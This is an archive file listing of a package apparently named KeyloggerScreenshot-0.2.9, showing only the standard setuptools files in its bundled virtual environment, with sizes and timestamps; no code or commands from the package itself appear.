--rw-rw-rw-   0        0        0      239 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/_macos_compat.py
--rw-rw-rw-   0        0        0    19672 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/_msvccompiler.py
--rw-rw-rw-   0        0        0     8603 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/archive_util.py
--rw-rw-rw-   0        0        0    14789 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/bcppcompiler.py
--rw-rw-rw-   0        0        0    47369 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/ccompiler.py
--rw-rw-rw-   0        0        0    17973 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/cmd.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.428394 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/
--rw-rw-rw-   0        0        0      430 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/__init__.py
--rw-rw-rw-   0        0        0     1614 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/_framework_compat.py
--rw-rw-rw-   0        0        0     5441 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/bdist.py
--rw-rw-rw-   0        0        0     4701 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/bdist_dumb.py
--rw-rw-rw-   0        0        0    22051 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/bdist_rpm.py
--rw-rw-rw-   0        0        0     5617 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/build.py
--rw-rw-rw-   0        0        0     7728 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/build_clib.py
--rw-rw-rw-   0        0        0    31558 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/build_ext.py
--rw-rw-rw-   0        0        0    16568 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/build_py.py
--rw-rw-rw-   0        0        0     5624 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/build_scripts.py
--rw-rw-rw-   0        0        0     4888 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/check.py
--rw-rw-rw-   0        0        0     2603 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/clean.py
--rw-rw-rw-   0        0        0    13137 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/config.py
--rw-rw-rw-   0        0        0    30221 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/install.py
--rw-rw-rw-   0        0        0     2779 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/install_data.py
--rw-rw-rw-   0        0        0     2785 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/install_egg_info.py
--rw-rw-rw-   0        0        0     1189 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/install_headers.py
--rw-rw-rw-   0        0        0     8434 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/install_lib.py
--rw-rw-rw-   0        0        0     1936 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/install_scripts.py
--rw-rw-rw-   0        0        0      672 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/py37compat.py
--rw-rw-rw-   0        0        0    11765 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/register.py
--rw-rw-rw-   0        0        0    19241 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/sdist.py
--rw-rw-rw-   0        0        0     7477 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/command/upload.py
--rw-rw-rw-   0        0        0     4920 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/config.py
--rw-rw-rw-   0        0        0     9451 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/core.py
--rw-rw-rw-   0        0        0    12537 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/cygwinccompiler.py
--rw-rw-rw-   0        0        0      139 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/debug.py
--rw-rw-rw-   0        0        0     3423 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/dep_util.py
--rw-rw-rw-   0        0        0     8082 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/dir_util.py
--rw-rw-rw-   0        0        0    50186 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/dist.py
--rw-rw-rw-   0        0        0     3589 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/errors.py
--rw-rw-rw-   0        0        0    10270 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/extension.py
--rw-rw-rw-   0        0        0    17910 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/fancy_getopt.py
--rw-rw-rw-   0        0        0     8226 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/file_util.py
--rw-rw-rw-   0        0        0    13713 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/filelist.py
--rw-rw-rw-   0        0        0     1972 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/log.py
--rw-rw-rw-   0        0        0    30235 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/msvc9compiler.py
--rw-rw-rw-   0        0        0    23602 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/msvccompiler.py
--rw-rw-rw-   0        0        0      217 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/py38compat.py
--rw-rw-rw-   0        0        0      639 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/py39compat.py
--rw-rw-rw-   0        0        0     3517 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/spawn.py
--rw-rw-rw-   0        0        0    18858 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/sysconfig.py
--rw-rw-rw-   0        0        0    12096 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/text_file.py
--rw-rw-rw-   0        0        0    15641 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/unixccompiler.py
--rw-rw-rw-   0        0        0    18128 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/util.py
--rw-rw-rw-   0        0        0    12952 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/version.py
--rw-rw-rw-   0        0        0     5248 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/versionpredicate.py
--rw-rw-rw-   0        0        0     1972 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_entry_points.py
--rw-rw-rw-   0        0        0     2392 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_imp.py
--rw-rw-rw-   0        0        0     1311 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_importlib.py
--rw-rw-rw-   0        0        0      675 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_itertools.py
--rw-rw-rw-   0        0        0      749 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_path.py
--rw-rw-rw-   0        0        0      501 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_reqs.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.468473 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.569295 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/
--rw-rw-rw-   0        0        0    30130 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/__init__.py
--rw-rw-rw-   0        0        0     1862 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/_adapters.py
--rw-rw-rw-   0        0        0      743 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/_collections.py
--rw-rw-rw-   0        0        0     1828 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/_compat.py
--rw-rw-rw-   0        0        0     2895 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/_functools.py
--rw-rw-rw-   0        0        0     2068 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/_itertools.py
--rw-rw-rw-   0        0        0     1154 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/_meta.py
--rw-rw-rw-   0        0        0     2166 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_metadata/_text.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.621189 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/
--rw-rw-rw-   0        0        0      506 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/__init__.py
--rw-rw-rw-   0        0        0     4504 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/_adapters.py
--rw-rw-rw-   0        0        0     2741 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/_common.py
--rw-rw-rw-   0        0        0     2706 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/_compat.py
--rw-rw-rw-   0        0        0      884 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/_itertools.py
--rw-rw-rw-   0        0        0     3494 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/_legacy.py
--rw-rw-rw-   0        0        0     3886 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/abc.py
--rw-rw-rw-   0        0        0     3566 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/readers.py
--rw-rw-rw-   0        0        0     2836 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/importlib_resources/simple.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.638688 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/jaraco/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/jaraco/__init__.py
--rw-rw-rw-   0        0        0     5420 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/jaraco/context.py
--rw-rw-rw-   0        0        0    13512 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/jaraco/functools.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.652818 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/jaraco/text/
--rw-rw-rw-   0        0        0    15517 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/jaraco/text/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.693703 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/more_itertools/
--rw-rw-rw-   0        0        0       82 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/more_itertools/__init__.py
--rw-rw-rw-   0        0        0   117959 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/more_itertools/more.py
--rw-rw-rw-   0        0        0    16256 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/more_itertools/recipes.py
--rw-rw-rw-   0        0        0    15130 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/ordered_set.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.788699 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/
--rw-rw-rw-   0        0        0      661 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/__about__.py
--rw-rw-rw-   0        0        0      497 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/__init__.py
--rw-rw-rw-   0        0        0    11488 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/_manylinux.py
--rw-rw-rw-   0        0        0     4378 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/_musllinux.py
--rw-rw-rw-   0        0        0     1431 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/_structures.py
--rw-rw-rw-   0        0        0     8493 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/markers.py
--rw-rw-rw-   0        0        0     4700 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/requirements.py
--rw-rw-rw-   0        0        0    30110 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/specifiers.py
--rw-rw-rw-   0        0        0    15699 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/tags.py
--rw-rw-rw-   0        0        0     4200 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/utils.py
--rw-rw-rw-   0        0        0    14665 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/packaging/version.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.905889 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/
--rw-rw-rw-   0        0        0     9159 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/__init__.py
--rw-rw-rw-   0        0        0     6426 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/actions.py
--rw-rw-rw-   0        0        0    12936 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/common.py
--rw-rw-rw-   0        0        0   213310 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/core.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.908405 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/diagram/
--rw-rw-rw-   0        0        0    23668 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/diagram/__init__.py
--rw-rw-rw-   0        0        0     9023 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/exceptions.py
--rw-rw-rw-   0        0        0    39129 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/helpers.py
--rw-rw-rw-   0        0        0    25341 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/results.py
--rw-rw-rw-   0        0        0    13402 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/testing.py
--rw-rw-rw-   0        0        0    10787 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/unicode.py
--rw-rw-rw-   0        0        0     6805 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/pyparsing/util.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.942620 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/tomli/
--rw-rw-rw-   0        0        0      396 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/tomli/__init__.py
--rw-rw-rw-   0        0        0    22633 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/tomli/_parser.py
--rw-rw-rw-   0        0        0     2943 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/tomli/_re.py
--rw-rw-rw-   0        0        0      254 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/tomli/_types.py
--rw-rw-rw-   0        0        0    87149 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/typing_extensions.py
--rw-rw-rw-   0        0        0     8425 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_vendor/zipp.py
--rw-rw-rw-   0        0        0     7346 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/archive_util.py
--rw-rw-rw-   0        0        0    19539 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/build_meta.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.269308 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/
--rw-rw-rw-   0        0        0      396 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/__init__.py
--rw-rw-rw-   0        0        0     2381 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/alias.py
--rw-rw-rw-   0        0        0    16623 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/bdist_egg.py
--rw-rw-rw-   0        0        0     1182 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/bdist_rpm.py
--rw-rw-rw-   0        0        0     6589 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/build.py
--rw-rw-rw-   0        0        0     4415 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/build_clib.py
--rw-rw-rw-   0        0        0    15821 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/build_ext.py
--rw-rw-rw-   0        0        0    14115 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/build_py.py
--rw-rw-rw-   0        0        0     7012 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/develop.py
--rw-rw-rw-   0        0        0     4800 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/dist_info.py
--rw-rw-rw-   0        0        0    85662 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/easy_install.py
--rw-rw-rw-   0        0        0    31188 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/editable_wheel.py
--rw-rw-rw-   0        0        0    26795 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/egg_info.py
--rw-rw-rw-   0        0        0     5163 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/install.py
--rw-rw-rw-   0        0        0     2226 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/install_egg_info.py
--rw-rw-rw-   0        0        0     3875 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/install_lib.py
--rw-rw-rw-   0        0        0     2612 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/install_scripts.py
--rw-rw-rw-   0        0        0     4946 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/py36compat.py
--rw-rw-rw-   0        0        0      468 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/register.py
--rw-rw-rw-   0        0        0     2128 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/rotate.py
--rw-rw-rw-   0        0        0      658 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/saveopts.py
--rw-rw-rw-   0        0        0     7071 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/sdist.py
--rw-rw-rw-   0        0        0     5086 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/setopt.py
--rw-rw-rw-   0        0        0     8102 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/test.py
--rw-rw-rw-   0        0        0      462 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/upload.py
--rw-rw-rw-   0        0        0     7494 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/command/upload_docs.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.332780 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/
--rw-rw-rw-   0        0        0     1121 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/__init__.py
--rw-rw-rw-   0        0        0    13398 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/_apply_pyprojecttoml.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.427192 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/_validate_pyproject/
--rw-rw-rw-   0        0        0     1038 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/_validate_pyproject/__init__.py
--rw-rw-rw-   0        0        0    11266 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/_validate_pyproject/error_reporting.py
--rw-rw-rw-   0        0        0     1153 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/_validate_pyproject/extra_validations.py
--rw-rw-rw-   0        0        0     1612 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/_validate_pyproject/fastjsonschema_exceptions.py
--rw-rw-rw-   0        0        0   269900 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/_validate_pyproject/fastjsonschema_validations.py
--rw-rw-rw-   0        0        0     8736 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/_validate_pyproject/formats.py
--rw-rw-rw-   0        0        0    16319 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/expand.py
--rw-rw-rw-   0        0        0    19304 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/pyprojecttoml.py
--rw-rw-rw-   0        0        0    25198 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/config/setupcfg.py
--rw-rw-rw-   0        0        0      949 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/dep_util.py
--rw-rw-rw-   0        0        0     5499 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/depends.py
--rw-rw-rw-   0        0        0    20799 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/discovery.py
--rw-rw-rw-   0        0        0    45578 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/dist.py
--rw-rw-rw-   0        0        0     2464 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/errors.py
--rw-rw-rw-   0        0        0     5591 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/extension.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.438510 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/extern/
--rw-rw-rw-   0        0        0     2512 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/extern/__init__.py
--rw-rw-rw-   0        0        0     4873 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/glob.py
--rw-rw-rw-   0        0        0     3824 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/installer.py
--rw-rw-rw-   0        0        0      812 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/launch.py
--rw-rw-rw-   0        0        0     1210 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/logging.py
--rw-rw-rw-   0        0        0     4857 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/monkey.py
--rw-rw-rw-   0        0        0    47724 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/msvc.py
